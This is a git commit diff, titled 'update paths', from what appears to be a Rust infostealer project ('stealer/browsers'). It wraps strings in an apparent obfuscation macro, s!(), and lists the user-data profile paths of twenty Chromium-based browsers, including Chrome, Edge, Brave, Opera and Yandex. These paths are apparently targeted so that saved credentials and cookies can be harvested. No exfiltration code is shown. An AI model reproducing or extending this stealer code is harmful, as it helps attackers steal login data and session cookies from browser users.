a50eebcccd4770f832abc3886e73dee8c5e1be41
sqlerrorthing <sqlerrorthing@gmail.com>
2025-05-21 10:03:06 +0800

    update paths

--- stealer/browsers/src/chromium/mod.rs
+++ stealer/browsers/src/chromium/mod.rs
@@ -38,28 +38,28 @@ macro_rules! browser {
 pub(super) fn get_chromium_browsers_paths<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
     let local = Path::localappdata();
     let appdata = Path::appdata();
-    let user_data = "User Data";
+    let user_data = s!("User Data");
 
     [
-        browser!("Amingo", &local / s!("Amingo") / user_data),
-        browser!("Torch", &local / s!("Torch") / user_data),
-        browser!("Kometa", &local / s!("Kometa") / user_data),
-        browser!("Orbitum", &local / s!("Orbitum") / user_data),
-        browser!("Epic Private", &local / s!("Epic Privacy Browser") / user_data),
-        browser!("Cent", &local / s!("CentBrowser") / user_data),
-        browser!("Vivaldi", &local / s!("Vivaldi") / user_data),
-        browser!("Chromium", &local / s!("Chromium") / user_data),
-        browser!("Thorium", &local / s!("Thorium") / user_data),
-        browser!("Opera", &local / s!("Opera Software") / s!("Opera Stable")),
-        browser!("Opera GX", &appdata / s!("Opera Software") / s!("Opera GX Stable")),
-        browser!("7Star", &local / s!("7Star") / s!("7Star") / user_data),
-        browser!("Sputnik", &local / s!("Sputnik") / s!("Sputnik") / user_data),
-        browser!("Chrome SxS", &local / s!("Google") / s!("Chrome SxS") / user_data),
-        browser!("Chrome", &local / s!("Google") / s!("Chrome") / user_data),
-        browser!("Edge", &local / s!("Microsoft") / s!("Edge") / user_data),
-        browser!("Uran", &local / s!("uCozMedia") / s!("Uran") / user_data),
-        browser!("Yandex", &local / s!("Yandex") / s!("YandexBrowser") / user_data),
-        browser!("Brave", &local / s!("BraveSoftware") / s!("Brave-Browser") / user_data),
-        browser!("Atom", &local / s!("Mail.Ru") / s!("Atom") / user_data),
+        browser!("Amingo",       &local   / s!("Amingo")               / user_data),
+        browser!("Torch",        &local   / s!("Torch")                / user_data),
+        browser!("Kometa",       &local   / s!("Kometa")               / user_data),
+        browser!("Orbitum",      &local   / s!("Orbitum")              / user_data),
+        browser!("Epic Private", &local   / s!("Epic Privacy Browser") / user_data),
+        browser!("Cent",         &local   / s!("CentBrowser")          / user_data),
+        browser!("Vivaldi",      &local   / s!("Vivaldi")              / user_data),
+        browser!("Chromium",     &local   / s!("Chromium")             / user_data),
+        browser!("Thorium",      &local   / s!("Thorium")              / user_data),
+        browser!("Opera",        &appdata / s!("Opera Software")       / s!("Opera Stable")),
+        browser!("Opera GX",     &appdata / s!("Opera Software")       / s!("Opera GX Stable")),
+        browser!("7Star",        &local   / s!("7Star")                / s!("7Star")         / user_data),
+        browser!("Sputnik",      &local   / s!("Sputnik")              / s!("Sputnik")       / user_data),
+        browser!("Chrome SxS",   &local   / s!("Google")               / s!("Chrome SxS")    / user_data),
+        browser!("Chrome",       &local   / s!("Google")               / s!("Chrome")        / user_data),
+        browser!("Edge",         &local   / s!("Microsoft")            / s!("Edge")          / user_data),
+        browser!("Uran",         &local   / s!("uCozMedia")            / s!("Uran")          / user_data),
+        browser!("Yandex",       &local   / s!("Yandex")               / s!("YandexBrowser") / user_data),
+        browser!("Brave",        &local   / s!("BraveSoftware")        / s!("Brave-Browser") / user_data),
+        browser!("Atom",         &local   / s!("Mail.Ru")              / s!("Atom")          / user_data),
     ]
 }
